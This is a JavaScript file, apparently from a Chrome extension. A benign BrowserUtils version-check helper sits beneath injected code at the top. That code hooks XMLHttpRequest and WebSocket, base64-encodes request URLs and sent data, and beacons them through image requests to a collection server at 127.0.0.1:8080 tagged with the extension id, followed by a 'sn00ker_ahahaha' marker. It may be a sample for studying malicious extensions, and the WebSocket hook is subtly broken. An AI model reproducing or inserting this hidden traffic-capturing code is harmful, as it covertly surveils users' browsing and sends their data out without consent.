function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
'use strict';
var BrowserUtils;
(function (BrowserUtils) {
    function isAPIAvailable() {
        return {
            tabsExecuteScriptFrameIdSupport: (getBrowserVersion() >= chromeVersionTabsExecuteScriptFrameIdSupport)
        };
    }
    BrowserUtils.isAPIAvailable = isAPIAvailable;
    var chromeVersionTabsExecuteScriptFrameIdSupport = 50;
    var userAgentNameChrome = "Chrome";
    function getBrowserVersion() {
        return getChromeVersion();
    }
    BrowserUtils.getBrowserVersion = getBrowserVersion;
    function getChromeVersion() {
        return genericGetBrowserVersion(userAgentNameChrome);
    }
    function genericGetBrowserVersion(browser) {
        var regExpToExtractVersion = new RegExp(browser + "\\/([0-9\\.]+)");
        var version = regExpToExtractVersion.exec(window.navigator.userAgent)[1];
        return parseInt(version);
    }
})(BrowserUtils || (BrowserUtils = {}));
